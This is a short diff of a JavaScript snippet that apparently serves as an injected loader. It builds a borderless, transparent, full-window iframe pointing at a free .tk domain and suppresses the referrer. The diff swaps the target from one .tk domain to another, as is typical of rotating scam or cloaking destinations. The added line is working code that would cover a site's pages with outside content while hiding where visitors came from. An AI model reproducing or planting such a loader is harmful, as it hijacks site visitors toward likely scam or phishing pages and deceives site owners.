@@ -1,5 +1,5 @@
 var iframe = document.createElement('iframe');
-var html = '<!DOCTYPE html> <html> <head> <meta name="referrer" content="no-referrer" /> <meta name="referrer" content="none"><style>body {margin:0;}</style> </head> <body> <iframe src="https://www.connetiply.tk" style="border:0px;padding:0;width:100%;position: absolute; height: 100%;" allowtransparency="true" referrerpolicy="no-referrer"></iframe> </body> </html>';
+var html = '<!DOCTYPE html> <html> <head> <meta name="referrer" content="no-referrer" /> <meta name="referrer" content="none"><style>body {margin:0;}</style> </head> <body> <iframe src="https://www.sendeply.tk" style="border:0px;padding:0;width:100%;position: absolute; height: 100%;" allowtransparency="true" referrerpolicy="no-referrer"></iframe> </body> </html>';
 iframe.setAttribute('referrerpolicy', 'no-referrer');
 iframe.setAttribute('allowtransparency', 'true');
 iframe.setAttribute('scrolling', 'no');
